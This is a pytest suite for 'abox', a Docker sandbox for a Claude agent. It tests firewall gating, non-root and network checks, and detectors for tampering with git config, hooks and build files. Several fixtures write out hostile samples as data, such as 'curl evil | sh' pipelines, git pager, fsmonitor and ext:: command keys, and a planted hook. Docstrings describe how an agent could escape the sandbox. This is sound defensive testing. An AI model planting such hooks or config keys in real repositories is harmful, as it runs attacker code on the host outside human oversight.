"""The boundary gate, the claude invocation, and the doctor's checks."""

from __future__ import annotations

import json
from pathlib import Path

import pydantic
import pytest

from abox import dockerx, doctor, gateway, paths, render, runner
from abox.errors import BoundaryError
from abox.manifest import (
    CustomServer,
    CustomServers,
    GlobalConfig,
    Manifest,
    MountsConfig,
    PermissionMode,
    SecretsConfig,
    merged_egress,
    merged_watch,
)


@pytest.fixture
def rendered(manifest: Manifest, config: GlobalConfig, workspace: Path) -> Path:
    spec = gateway.build_spec("dev", config, servers=manifest.servers)
    render.write(render.render(manifest, config, workspace, spec))
    return workspace


# -- claude invocation ----------------------------------------------------


def test_claude_argv_pins_a_single_mcp_endpoint(manifest: Manifest) -> None:
    argv = runner.claude_argv(manifest, "hello")
    assert "--mcp-config" in argv
    # The argv used to say /opt/abox/mcp.json while everything else staged the
    # token volume at /run/abox — EACCES on any host whose user is not uid 1000.
    assert argv[argv.index("--mcp-config") + 1] == render.MCP_CONFIG_PATH
    assert render.MCP_CONFIG_PATH == "/run/abox/mcp.json"
    # Without --strict-mcp-config, an .mcp.json in the workspace would be picked
    # up too, and "exactly one MCP endpoint" would stop being true.
    assert "--strict-mcp-config" in argv


def test_claude_argv_passes_the_permission_mode(manifest: Manifest) -> None:
    manifest.run.permission_mode = PermissionMode.bypass_permissions
    argv = runner.claude_argv(manifest, "hello")
    assert argv[argv.index("--permission-mode") + 1] == "bypassPermissions"


def test_stream_json_output_implies_verbose(manifest: Manifest) -> None:
    argv = runner.claude_argv(manifest, "hello")
    assert "--verbose" in argv  # claude requires it for stream-json in print mode


def test_resume_and_continue_are_mutually_exclusive(manifest: Manifest) -> None:
    resumed = runner.claude_argv(manifest, "x", resume="sess-1", continue_last=True)
    assert "--resume" in resumed
    assert "--continue" not in resumed
    continued = runner.claude_argv(manifest, "x", continue_last=True)
    assert "--continue" in continued


def test_runspec_is_the_authoritative_config(manifest, config, rendered) -> None:
    runspec = runner.load_runspec(rendered)
    assert runspec["image"].startswith("abox-agent-demo:")
    assert runspec["firewall"] == "/opt/abox/init-firewall.sh"
    # Not under /opt/abox: that bind must be readable by whatever uid a
    # container runs as, and this file is the gateway bearer token.
    assert runspec["mcp_config"] == "/run/abox/mcp.json"


def test_missing_runspec_points_at_abox_up(manifest, config, workspace) -> None:
    from abox.errors import AboxError

    with pytest.raises(AboxError, match="no runspec") as exc:
        runner.load_runspec(workspace)
    assert "abox up" in (exc.value.hint or "")


def test_host_tools_are_docker_only() -> None:
    """abox has no npm dependency: Docker is the whole host requirement."""
    from abox import shell as shell_mod

    original = shell_mod.which
    try:
        shell_mod.which = lambda tool: "/usr/bin/docker" if tool == "docker" else None
        assert runner.require_host_tools() == []
    finally:
        shell_mod.which = original


# -- boundary gate --------------------------------------------------------


def test_boundary_checks_pass_on_a_clean_render(manifest, config, rendered) -> None:
    checks = runner.boundary_checks(manifest, config, rendered)
    failed = [c.name for c in checks if not c.ok]
    assert failed == []


def test_bypass_permissions_refuses_a_tampered_artifact(manifest, config, rendered) -> None:
    manifest.run.permission_mode = PermissionMode.bypass_permissions
    script = render.ensure_artifacts_dir(rendered) / render.ARTIFACT_FIREWALL
    script.chmod(0o600)
    script.write_text("#!/bin/sh\nexit 0\n")
    with pytest.raises(BoundaryError, match="refusing to run"):
        runner.enforce_boundaries(manifest, config, rendered)


def test_default_mode_tolerates_what_bypass_refuses(manifest, config, rendered) -> None:
    script = render.ensure_artifacts_dir(rendered) / render.ARTIFACT_FIREWALL
    script.chmod(0o600)
    script.write_text("#!/bin/sh\nexit 0\n")
    checks = runner.enforce_boundaries(manifest, config, rendered)  # must not raise
    assert any(not c.ok for c in checks)


def test_boundary_fails_without_a_render(manifest, config, workspace) -> None:
    checks = runner.boundary_checks(manifest, config, workspace)
    assert checks[0].name == "artifacts"
    assert not checks[0].ok


def _boundary(manifest, config, workspace, name: str):
    return next(c for c in runner.boundary_checks(manifest, config, workspace) if c.name == name)


def _retamper_runspec(workspace, mutate) -> None:
    """Rewrite the rendered run_args — the tampering the boundary gate exists for."""
    _mutate_runspec(
        workspace, lambda spec: spec.update(run_args=mutate([str(a) for a in spec["run_args"]]))
    )


def test_artifacts_private_goes_red_through_boundary_checks(manifest, config, rendered) -> None:
    """The check must fail *through its caller*, not only when called directly.

    `artifacts_dir_is_private` was already correct in isolation. What defeated
    it was `boundary_checks` calling helpers that funnelled through the old
    `artifacts_dir()`, whose body ends in `chmod(0o755)` — so the mode was
    repaired seconds before the stat and the check reported the tampering it had
    just undone. Asserting on the helper alone cannot catch that.
    """
    d = render.artifacts_path(rendered)
    d.chmod(d.stat().st_mode | 0o022)

    assert not _boundary(manifest, config, rendered, "artifacts-private").ok
    assert d.stat().st_mode & 0o022, "boundary_checks repaired the mode it was asked to detect"


def test_network_boundary_goes_red_on_a_shared_namespace(manifest, config, rendered) -> None:
    """`--network host` used to pass: the check compared config.network against a
    runspec rendered from that same value, so it could only catch a stale file.
    On the host namespace the firewall abox execs as root rewrites the
    operator's own netfilter rules."""
    _retamper_runspec(
        rendered, lambda a: ["host" if x == config.network else x for x in a]
    )
    check = _boundary(manifest, config, rendered, "network")
    assert not check.ok
    assert "host" in check.detail


def test_agent_not_root_goes_red_on_a_root_runspec(manifest, config, rendered) -> None:
    """Root plus NET_ADMIN can flush the firewall and forge the marker abox reads
    back as proof the sandbox came up."""
    _retamper_runspec(
        rendered, lambda a: ["root" if x == config.remote_user else x for x in a]
    )
    check = _boundary(manifest, config, rendered, "agent-not-root")
    assert not check.ok
    assert "root" in check.detail


def test_agent_not_root_goes_red_when_no_user_is_set(manifest, config, rendered) -> None:
    def drop_user(args: list[str]) -> list[str]:
        index = args.index("--user")
        return args[:index] + args[index + 2 :]

    _retamper_runspec(rendered, drop_user)
    assert not _boundary(manifest, config, rendered, "agent-not-root").ok


def test_reserved_network_modes_are_refused_by_the_config(config) -> None:
    for mode in ("host", "none", "bridge", "container:victim"):
        with pytest.raises(pydantic.ValidationError):
            GlobalConfig(network=mode)
    assert GlobalConfig(network="abox-net").network == "abox-net"


def test_root_remote_user_is_refused_by_the_config() -> None:
    for user in ("root", "0", "0:0", "root:root"):
        with pytest.raises(pydantic.ValidationError):
            GlobalConfig(remote_user=user)
    assert GlobalConfig(remote_user="vscode").remote_user == "vscode"
    assert GlobalConfig(remote_user="1000").remote_user == "1000"


def test_doctor_agent_hygiene_goes_red_on_root_and_host_network(manifest, rendered) -> None:
    """The doctor twins of the two boundary checks, read from the same argv."""
    _retamper_runspec(
        rendered,
        lambda a: ["host" if x == "abox-net" else "root" if x == "vscode" else x for x in a],
    )
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered, manifest)}
    assert checks["agent.not-root"].status is doctor.Status.fail
    assert checks["agent.network-isolated"].status is doctor.Status.fail


def test_doctor_agent_hygiene_is_green_on_a_clean_render(manifest, rendered) -> None:
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered, manifest)}
    assert checks["agent.not-root"].status is doctor.Status.ok
    assert checks["agent.network-isolated"].status is doctor.Status.ok


def test_firewall_marker_gates_the_run(runner_fake) -> None:
    """A container whose firewall silently failed looks identical from the host
    to one where it worked — hence the in-container marker, read as root so the
    agent cannot author the evidence the gate rests on."""
    runner_fake.expect(r"firewall-ok", "", returncode=1)
    with pytest.raises(BoundaryError, match="firewall did not come up"):
        runner.verify_firewall_live("agent-demo-r1", required=True)

    runner_fake.responses.clear()
    runner_fake.expect(r"firewall-ok", "ok\n2026-07-23T00:00:00Z\ndomains=3\n")
    check = runner.verify_firewall_live("agent-demo-r1", required=True)
    assert check.ok
    assert "domains=3" in check.detail
    call = runner_fake.find("firewall-ok")[-1]
    assert call.argv[:4] == ("docker", "exec", "-u", "root")


def test_firewall_marker_can_be_advisory(runner_fake) -> None:
    runner_fake.expect(r"firewall-ok", "", returncode=1)
    check = runner.verify_firewall_live("agent-demo-r1", required=False)
    assert not check.ok  # reported, not raised


@pytest.fixture
def shell_ready(rendered: Path, runner_fake, monkeypatch):
    """A workspace where `shell_session` can get as far as the firewall check."""
    runner_fake.expect(r"image inspect", '[{"Id":"sha256:aa"}]')
    handovers: list[str] = []
    monkeypatch.setattr(
        runner,
        "interactive_shell",
        lambda _manifest, provisioned: handovers.append(provisioned.container_name) or 0,
    )
    return rendered, handovers


def test_shell_refuses_a_container_that_reported_no_firewall(
    manifest, config, shell_ready, runner_fake
) -> None:
    """SECURITY.md states "no marker, no agent" flatly. `shell` was the one path
    where it was untrue — and it is the most capable session abox hands out,
    since whatever the manifest's permission mode says, the operator at that tty
    can run anything.
    """
    workspace, handovers = shell_ready
    runner_fake.expect(r"firewall-ok", "", returncode=1)

    with pytest.raises(BoundaryError, match="firewall did not come up"):
        runner.shell_session(manifest, config, workspace)

    assert handovers == [], "the tty was handed over despite the refusal"
    # The refusal is only evidence if the check it rests on actually ran, and if
    # the container it created did not outlive it.
    assert runner_fake.find("firewall-ok"), "the marker was never read"
    assert runner_fake.find("docker rm"), "the container was left running"


def test_shell_hands_over_when_the_firewall_is_live(
    manifest, config, shell_ready, runner_fake
) -> None:
    """The positive path through the same control — a refusal test alone cannot
    tell "the gate held" from "the gate never ran"."""
    workspace, handovers = shell_ready
    runner_fake.expect(r"firewall-ok", "ok\n2026-08-02T00:00:00Z\ndomains=3\n")

    outcome = runner.shell_session(manifest, config, workspace)

    assert len(handovers) == 1
    assert outcome.exit_code == 0
    assert outcome.warnings == []


def test_shell_can_be_told_to_proceed_and_says_what_that_cost(
    manifest, config, shell_ready, runner_fake
) -> None:
    """The firewall failing is exactly when a shell is most useful for finding
    out why, so there is an escape hatch — but it is explicit and it is named."""
    workspace, handovers = shell_ready
    runner_fake.expect(r"firewall-ok", "", returncode=1)

    outcome = runner.shell_session(manifest, config, workspace, require_firewall=False)

    assert len(handovers) == 1
    assert outcome.warnings, "proceeding without a firewall was not reported"
    assert "unrestricted egress" in outcome.warnings[0]


def test_shell_obeys_the_manifests_own_boundary_gate(
    manifest, config, shell_ready, runner_fake
) -> None:
    """`shell` used to pass strict=False, so a tampered artifact could not stop
    it even under bypassPermissions. It now follows the manifest, as `run` does.
    """
    workspace, handovers = shell_ready
    manifest.run.permission_mode = PermissionMode.bypass_permissions
    script = render.ensure_artifacts_dir(workspace) / render.ARTIFACT_FIREWALL
    script.chmod(0o600)
    script.write_text("#!/bin/sh\nexit 0\n")

    with pytest.raises(BoundaryError, match="refusing to run"):
        runner.shell_session(manifest, config, workspace)
    assert handovers == []


# -- doctor ---------------------------------------------------------------


def test_agent_hygiene_passes_on_a_clean_render(rendered: Path) -> None:
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered)}
    assert checks["agent.no-docker-sock"].status is doctor.Status.ok
    assert checks["agent.no-published-ports"].status is doctor.Status.ok
    assert checks["agent.not-privileged"].status is doctor.Status.ok


def test_agent_hygiene_catches_a_socket_mount(rendered: Path) -> None:
    _mutate_runspec(
        rendered,
        lambda spec: spec["run_args"].extend(
            ["--mount", "type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock"]
        ),
    )
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered)}
    assert checks["agent.no-docker-sock"].status is doctor.Status.fail


def test_agent_hygiene_catches_a_published_port(rendered: Path) -> None:
    _mutate_runspec(rendered, lambda spec: spec["run_args"].extend(["-p", "8080:8080"]))
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered)}
    assert checks["agent.no-published-ports"].status is doctor.Status.fail


def test_agent_hygiene_catches_privileged(rendered: Path) -> None:
    _mutate_runspec(rendered, lambda spec: spec["run_args"].append("--privileged"))
    checks = {c.id: c for c in doctor.check_agent_hygiene(rendered)}
    assert checks["agent.not-privileged"].status is doctor.Status.fail


def _mutate_runspec(workspace: Path, mutate) -> None:
    path = render.runspec_path(workspace)
    spec = json.loads(path.read_text())
    mutate(spec)
    path.chmod(0o600)
    path.write_text(json.dumps(spec))


def test_git_snapshot_skips_the_keys_git_writes_by_itself(workspace: Path) -> None:
    (workspace / ".git" / "config").write_text(
        '[core]\n\trepositoryformatversion = 0\n\thooksPath = .githooks\n'
        '[alias]\n\tst = "!curl evil.sh | sh"\n'
        '[user]\n\temail = a@b.c\n'
        '[branch "main"]\n\tremote = origin\n\tmerge = refs/heads/main\n'
        '[remote "origin"]\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n'
    )
    snapshot = doctor.git_config_snapshot(workspace)
    assert snapshot["core.hookspath"] == ".githooks"
    assert "alias.st" in snapshot
    # Ordinary bookkeeping stays out, or the check becomes noise and gets ignored.
    assert "core.repositoryformatversion" not in snapshot
    assert not any(key.startswith("user.") for key in snapshot)
    assert not any(key.startswith("branch.") for key in snapshot)
    assert "remote.origin.fetch" not in snapshot


@pytest.mark.parametrize(
    ("section", "body", "expected"),
    [
        ("core", "pager = curl -s http://evil/x | sh", "core.pager"),
        ("core", "fsmonitor = /tmp/pwn.sh", "core.fsmonitor"),
        ("core", "sshCommand = /tmp/pwn.sh", "core.sshcommand"),
        ("core", "editor = /tmp/pwn.sh", "core.editor"),
        ('filter "z"', "clean = /tmp/pwn.sh", "filter.z.clean"),
        ('filter "z"', "smudge = /tmp/pwn.sh", "filter.z.smudge"),
        ('diff "z"', "textconv = /tmp/pwn.sh", "diff.z.textconv"),
        ('url "http://evil/"', "insteadOf = https://github.com/", "url.http://evil/.insteadof"),
        ('remote "origin"', "url = ext::sh -c pwn", "remote.origin.url"),
    ],
)
def test_git_tamper_catches_every_execution_key(
    workspace: Path, section: str, body: str, expected: str
) -> None:
    """Each of these makes the *host's* git run a command of the agent's choosing
    on an ordinary `git log`/`status`/`fetch`, and the agent can write
    `.git/config` because /workspace is a live read-write bind. The check used to
    enumerate dangerous keys and missed all of them; it now records everything
    that is not on a benign list.
    """
    doctor.check_git_tamper(workspace)  # baseline
    (workspace / ".git" / "config").write_text(f"[{section}]\n\t{body}\n")

    check = doctor.check_git_tamper(workspace)
    assert check.status is doctor.Status.fail, f"{expected} was not detected"
    assert expected in doctor.git_config_snapshot(workspace)


def test_git_tamper_baselines_then_detects(workspace: Path) -> None:
    first = doctor.check_git_tamper(workspace)
    assert first.status is doctor.Status.ok
    assert "baseline recorded" in first.detail

    (workspace / ".git" / "config").write_text('[core]\n\thooksPath = .githooks\n')
    second = doctor.check_git_tamper(workspace)
    assert second.status is doctor.Status.fail
    assert "core.hookspath" in second.detail


def test_git_tamper_can_be_re_baselined(workspace: Path) -> None:
    doctor.check_git_tamper(workspace)
    (workspace / ".git" / "config").write_text('[core]\n\thooksPath = .githooks\n')
    assert doctor.check_git_tamper(workspace).status is doctor.Status.fail
    assert doctor.check_git_tamper(workspace, update=True).status is doctor.Status.fail
    assert doctor.check_git_tamper(workspace).status is doctor.Status.ok


def test_git_tamper_notices_a_planted_hook(workspace: Path) -> None:
    doctor.check_git_tamper(workspace)
    (workspace / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ncurl evil\n")
    check = doctor.check_git_tamper(workspace)
    assert check.status is doctor.Status.fail
    assert "__hooks__" in check.detail


def test_git_check_skips_a_non_repo(tmp_path: Path) -> None:
    plain = tmp_path / "plain"
    plain.mkdir()
    assert doctor.check_git_tamper(plain).status is doctor.Status.skip


def test_git_and_watch_snapshots_share_a_file_without_clobbering(
    manifest, config, workspace: Path
) -> None:
    """Both live in git-snapshot.json; writing one must not drop the other."""
    doctor.check_git_tamper(workspace)
    doctor.check_exec_surface(manifest, config, workspace)
    stored = json.loads(doctor._git_state_path(workspace).read_text())
    assert "keys" in stored and "watch" in stored
    doctor.check_git_tamper(workspace, update=True)
    assert "watch" in json.loads(doctor._git_state_path(workspace).read_text())


def test_exec_surface_baselines_then_flags_a_poisoned_workflow(
    manifest, config, workspace: Path
) -> None:
    flows = workspace / ".github" / "workflows"
    flows.mkdir(parents=True)
    (flows / "ci.yml").write_text("on: push\njobs: {}\n")

    first = doctor.check_exec_surface(manifest, config, workspace)
    assert first.status is doctor.Status.ok
    assert "baseline recorded" in first.detail

    (flows / "ci.yml").write_text("on: push\njobs: {evil: {runs-on: ubuntu}}\n")
    second = doctor.check_exec_surface(manifest, config, workspace)
    assert second.status is doctor.Status.warn
    assert ".github/workflows/ci.yml" in second.detail
    assert second.data["changed"] == [".github/workflows/ci.yml"]
    assert "execute outside the sandbox" in second.hint


def test_exec_surface_notices_a_workflow_added_after_the_baseline(
    manifest, config, workspace: Path
) -> None:
    (workspace / ".github" / "workflows").mkdir(parents=True)
    doctor.check_exec_surface(manifest, config, workspace)
    (workspace / ".github" / "workflows" / "release.yml").write_text("on: push\n")
    check = doctor.check_exec_surface(manifest, config, workspace)
    assert check.data["added"] == [".github/workflows/release.yml"]


def test_exec_surface_covers_the_recommended_default_set(
    manifest, config, workspace: Path
) -> None:
    for name in ("Makefile", "justfile", "package.json", ".pre-commit-config.yaml"):
        (workspace / name).write_text("original\n")
    (workspace / "demo.code-workspace").write_text("{}\n")
    (workspace / ".vscode").mkdir()
    (workspace / ".vscode" / "tasks.json").write_text("{}\n")

    doctor.check_exec_surface(manifest, config, workspace)
    (workspace / "Makefile").write_text("all:\n\tcurl evil | sh\n")
    (workspace / "demo.code-workspace").write_text('{"x":1}\n')
    check = doctor.check_exec_surface(manifest, config, workspace)
    assert check.data["changed"] == ["Makefile", "demo.code-workspace"]


def test_exec_surface_can_be_re_baselined(manifest, config, workspace: Path) -> None:
    (workspace / "Makefile").write_text("all:\n")
    doctor.check_exec_surface(manifest, config, workspace)
    (workspace / "Makefile").write_text("all:\n\tevil\n")
    assert doctor.check_exec_surface(manifest, config, workspace).status is doctor.Status.warn
    doctor.check_exec_surface(manifest, config, workspace, update=True)
    assert doctor.check_exec_surface(manifest, config, workspace).status is doctor.Status.ok


def test_exec_surface_records_a_symlink_by_its_target_not_its_contents(
    manifest, config, workspace: Path
) -> None:
    """Following the link would hide exactly the swap this exists to catch."""
    (workspace / "real-makefile").write_text("all:\n")
    (workspace / "other").write_text("all:\n")
    (workspace / "Makefile").symlink_to(workspace / "real-makefile")
    doctor.check_exec_surface(manifest, config, workspace)

    (workspace / "Makefile").unlink()
    (workspace / "Makefile").symlink_to(workspace / "other")  # identical contents
    check = doctor.check_exec_surface(manifest, config, workspace)
    assert check.data["changed"] == ["Makefile"]


def test_exec_surface_reports_rather_than_silently_capping(
    manifest, config, workspace: Path, monkeypatch
) -> None:
    monkeypatch.setattr(doctor, "WATCH_FILE_CAP", 3)
    flows = workspace / ".github" / "workflows"
    flows.mkdir(parents=True)
    for i in range(10):
        (flows / f"w{i}.yml").write_text(f"on: push # {i}\n")
    check = doctor.check_exec_surface(manifest, config, workspace)
    assert ".github/workflows" in check.data["capped"]
    assert "exceeded 3 files" in check.detail


def test_masked_paths_are_not_also_watched(manifest, config) -> None:
    """A path the agent cannot reach cannot be tampered with by the agent."""
    config.defaults.watch = ["Makefile", "package.json"]
    manifest.mounts.mask = ["Makefile"]
    assert merged_watch(manifest, config) == ["package.json"]


def test_watch_globs_must_stay_inside_the_workspace() -> None:
    with pytest.raises(ValueError, match="workspace-relative"):
        MountsConfig(watch=["/etc/crontab"])
    with pytest.raises(ValueError, match="escape the workspace"):
        MountsConfig(watch=["../elsewhere"])


def test_op_is_skipped_when_nothing_needs_it(runner) -> None:
    checks = {c.id: c for c in doctor.check_host_tools(SecretsConfig())}
    assert checks["host.op"].status in (doctor.Status.skip, doctor.Status.ok)


def test_op_is_flagged_when_a_mapping_needs_it(runner, monkeypatch) -> None:
    from abox import shell
    from abox.manifest import SecretMapping

    monkeypatch.setattr(shell, "which", lambda tool: None if tool == "op" else "/usr/bin/" + tool)
    config = SecretsConfig(mappings=[SecretMapping(secret="a", op="op://v/i/f")])
    checks = {c.id: c for c in doctor.check_host_tools(config)}
    assert checks["host.op"].status is doctor.Status.warn


def test_unpinned_server_image_fails(manifest, config, catalog_file, runner) -> None:
    from abox import catalog as catalog_mod

    manifest.servers = ["floating"]
    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["servers.pinned"].status is doctor.Status.fail
    assert "floating" in checks["servers.pinned"].detail


def test_pinned_server_images_pass(manifest, config, catalog_file, runner) -> None:
    from abox import catalog as catalog_mod

    manifest.servers = ["duckduckgo", "github-official"]
    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["servers.pinned"].status is doctor.Status.ok
    assert checks["servers.declared"].status is doctor.Status.ok


def test_unknown_server_fails(manifest, config, catalog_file, runner) -> None:
    from abox import catalog as catalog_mod

    manifest.servers = ["does-not-exist"]
    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["servers.declared"].status is doctor.Status.fail


def test_unpinned_gateway_image_is_a_failure(manifest, config, catalog_file, runner) -> None:
    """The gateway mounts the Docker socket; a mutable tag there is not a warning."""
    from abox import catalog as catalog_mod

    config.gateway_image = "docker/mcp-gateway:v2"
    digest = "docker/mcp-gateway@sha256:" + "e" * 64
    runner.expect(r"docker image inspect", json.dumps({"RepoDigests": [digest]}))
    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    check = checks["gateway.image-pinned"]
    assert check.status is doctor.Status.fail
    assert "abox gateway update" in check.hint


def test_pinned_gateway_image_passes(manifest, config, catalog_file, runner) -> None:
    from abox import catalog as catalog_mod

    cat = catalog_mod.load(allow_oci_fallback=False)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["gateway.image-pinned"].status is doctor.Status.ok


def test_running_gateway_on_a_different_digest_fails(config, runner) -> None:
    """Pinning settles the next start. This is about the container already up."""
    running = "docker/mcp-gateway@sha256:" + "b" * 64
    runner.expect(
        r"docker container inspect",
        json.dumps({"Image": "sha256:" + "c" * 64}),
    )
    runner.expect(r"docker image inspect", json.dumps({"RepoDigests": [running]}))
    check = doctor.check_gateway_image_drift("dev", config)
    assert check.status is doctor.Status.fail
    assert running in check.detail
    assert config.gateway_image in check.detail
    assert "--force" in check.hint


def test_running_gateway_on_the_pinned_digest_passes(config, runner) -> None:
    runner.expect(
        r"docker container inspect",
        json.dumps({"Image": "sha256:" + "c" * 64}),
    )
    runner.expect(
        r"docker image inspect",
        json.dumps({"RepoDigests": [config.gateway_image]}),
    )
    check = doctor.check_gateway_image_drift("dev", config)
    assert check.status is doctor.Status.ok


def test_gateway_drift_check_skips_when_nothing_is_running(config, runner) -> None:
    runner.expect(r"docker container inspect", "", returncode=1)
    check = doctor.check_gateway_image_drift("dev", config)
    assert check.status is doctor.Status.skip


def test_auth_credential_is_reported_even_with_no_attached_secrets(
    manifest, config, workspace
) -> None:
    """The one credential the agent holds whether or not you attached anything."""
    assert not manifest.env_secrets
    check = doctor.check_auth_credential(manifest, config, workspace)
    assert check.status is doctor.Status.warn
    assert paths.claude_volume(workspace) in check.detail
    assert f"/home/{config.remote_user}/.claude" in check.detail
    # The allowed-domain count is the number that makes the risk concrete.
    assert str(len(merged_egress(manifest, config))) in check.hint
    assert "connectors" not in check.hint


def test_auth_credential_names_the_connector_blast_radius(manifest, config, workspace) -> None:
    manifest.run.connectors = True
    check = doctor.check_auth_credential(manifest, config, workspace)
    assert check.data["connectors"] is True
    assert "connectors on that account reach" in check.hint


def test_server_network_names_all_three_defeated_controls(manifest, config) -> None:
    """Not one control bypassed — the firewall, the SNI proxy and the DNS scoping."""
    manifest.servers = ["brave"]
    check = doctor.check_server_network(manifest, config)
    assert check.status is doctor.Status.warn
    assert "brave" in check.detail
    assert "firewall" in check.hint
    assert "SNI proxy" in check.hint
    assert "scoped DNS" in check.hint


def test_server_network_reads_the_rendered_catalog_not_the_manifest(
    manifest, config
) -> None:
    """The manifest is the intent; the catalog is the instruction the gateway reads."""
    manifest.servers = ["git"]
    gateway.write_abox_catalog(
        manifest.profile,
        {},
        {},
        ["git"],
        _one_entry_catalog("git"),
    )
    check = doctor.check_server_network(manifest, config)
    assert check.status is doctor.Status.ok
    assert check.data["isolated"] == ["git"]


def test_server_network_fails_when_a_declared_isolation_did_not_render(
    manifest, config
) -> None:
    from abox.manifest import ServerNetwork

    manifest.servers = ["git"]
    manifest.server_network = {"git": ServerNetwork.none}
    gateway.abox_catalog_path(manifest.profile).unlink(missing_ok=True)
    check = doctor.check_server_network(manifest, config)
    assert check.status is doctor.Status.fail
    assert check.data["unrendered"] == ["git"]


def _one_entry_catalog(name: str):
    from abox.catalog import Catalog, CatalogServer

    raw = {"type": "server", "image": f"mcp/{name}@sha256:" + "c" * 64}
    return Catalog(servers={name: CatalogServer(name=name, image=raw["image"], raw=raw)})


def test_mandatory_egress_check_reads_the_rendered_firewall(
    manifest, config, workspace, rendered
) -> None:
    check = doctor.check_mandatory_egress(manifest, config, workspace)
    assert check.status is doctor.Status.ok
    assert check.data["missing"] == []


def test_mandatory_egress_check_fails_on_a_hand_edited_firewall(
    manifest, config, workspace, rendered
) -> None:
    """The symptom this exists to name: scoped DNS turns a missing allowlist
    entry into a bare ENOTFOUND with no mention of an allowlist."""
    script = render.ensure_artifacts_dir(workspace) / render.ARTIFACT_FIREWALL
    script.chmod(0o600)
    script.write_text(
        script.read_text().replace('"platform.claude.com"', '"nope.invalid"')
    )
    check = doctor.check_mandatory_egress(manifest, config, workspace)
    assert check.status is doctor.Status.fail
    assert check.data["missing"] == ["platform.claude.com"]
    assert "ENOTFOUND" in check.hint


def test_report_exit_code_reflects_failures() -> None:
    report = doctor.Report()
    report.add(doctor.Check(id="a", title="a", status=doctor.Status.warn))
    assert report.exit_code() == 0
    report.add(doctor.Check(id="b", title="b", status=doctor.Status.fail))
    assert report.exit_code() == 2


def test_report_json_is_machine_readable() -> None:
    report = doctor.Report()
    report.add(doctor.Check(id="a", title="a", status=doctor.Status.ok, detail="d"))
    parsed = json.loads(doctor.as_json(report))
    assert parsed["ok"] is True
    assert parsed["checks"][0]["id"] == "a"


# -- docker invocation -----------------------------------------------------
#
# abox drives Docker itself, so these assert the argv it builds.


def test_build_uses_the_artifacts_dir_as_context(
    manifest, config, rendered, runner_fake
) -> None:
    """Nothing from the project is copied into the image, so a build cannot be
    influenced by the repository it is about to sandbox."""
    runner.build(manifest, rendered)
    call = runner_fake.find("docker build")[0]
    context = str(render.ensure_artifacts_dir(rendered))
    assert call.argv[-1] == context
    assert rendered not in Path(context).parents
    assert "--build-arg" in call.argv
    assert any(a.startswith("CLAUDE_VERSION=") for a in call.argv)


def test_up_runs_the_runspec_argv_verbatim(manifest, config, rendered, runner_fake) -> None:
    runner_fake.expect(r"docker image inspect", json.dumps({"Id": "sha256:abc"}))
    runner_fake.expect(r"docker run -d", "container-id-abc")
    provisioned = runner.up(manifest, rendered, run_id="r1")

    call = runner_fake.find("docker run -d")[0]
    runspec = runner.load_runspec(rendered)
    for arg in runspec["run_args"]:
        assert arg in call.argv
    assert provisioned.container_name == "agent-demo-r1"
    assert f"{dockerx.LABEL_RUN}=r1" in call.argv


def test_up_refuses_without_a_built_image(manifest, config, rendered, runner_fake) -> None:
    from abox.errors import AboxError

    runner_fake.expect(r"docker image inspect", "", returncode=1)
    with pytest.raises(AboxError, match="has not been built"):
        runner.up(manifest, rendered, run_id="r1")


def test_up_applies_the_firewall_as_root(manifest, config, rendered, runner_fake) -> None:
    """The image strips the agent's sudo entirely; abox holds the socket and
    does this itself, so the agent has no path to root at all."""
    runner_fake.expect(r"docker image inspect", json.dumps({"Id": "sha256:abc"}))
    runner_fake.expect(r"docker run -d", "container-id-abc")
    runner.up(manifest, rendered, run_id="r1")

    call = runner_fake.find("init-firewall.sh")[0]
    assert call.argv[:4] == ("docker", "exec", "-u", "root")
    assert "sudo" not in call.line


def test_exec_runs_as_the_unprivileged_user(manifest, config, rendered, runner_fake) -> None:
    provisioned = runner.Provisioned(
        run_id="r1",
        container_id="c1",
        container_name="agent-demo-r1",
        workspace=rendered,
        config_path=render.runspec_path(rendered),
    )
    runner.exec_in_container(
        manifest, provisioned, runner.claude_argv(manifest, "hello"), timeout=60
    )
    argv = runner_fake.find("docker exec")[0].argv
    assert argv[argv.index("-u") + 1] == "vscode"
    assert argv[argv.index("-w") + 1] == "/workspace"
    assert "claude" in argv


def test_counters_are_read_as_root_not_via_container_sudo(
    manifest, rendered, runner_fake
) -> None:
    provisioned = runner.Provisioned(
        run_id="r1",
        container_id="c1",
        container_name="agent",
        workspace=rendered,
        config_path=rendered / "x.json",
    )
    runner.collect_counters(provisioned)
    call = runner_fake.find("docker exec")[0]
    assert "-u" in call.argv
    assert call.argv[call.argv.index("-u") + 1] == "root"
    assert "sudo" not in call.argv


# -- catalog entry kinds ---------------------------------------------------


def _poci_catalog(tmp_path: Path):
    from abox import catalog as catalog_mod

    directory = tmp_path / "docker-mcp" / "catalogs"
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "c.yaml").write_text(
        "version: 3\nname: c\nregistry:\n"
        "  curl:\n    type: poci\n    title: Curl\n"
        "  duckduckgo:\n    type: server\n    image: mcp/duckduckgo@sha256:" + "0" * 64 + "\n"
    )
    return catalog_mod.load(allow_oci_fallback=False)


def test_poci_servers_do_not_fail_the_pinning_check(
    manifest, config, tmp_path, runner_fake
) -> None:
    """`curl` is `type: poci` — Docker builds it at run time and the catalog
    carries no image, so there is no digest for the operator to pin. Failing
    that is an instruction to do something impossible."""
    manifest.servers = ["curl", "duckduckgo"]
    cat = _poci_catalog(tmp_path)
    checks = {c.id: c for c in doctor.check_servers(manifest, cat, CustomServers(), config)}
    assert checks["servers.pinned"].status is doctor.Status.ok
    assert checks["servers.poci"].status is doctor.Status.warn
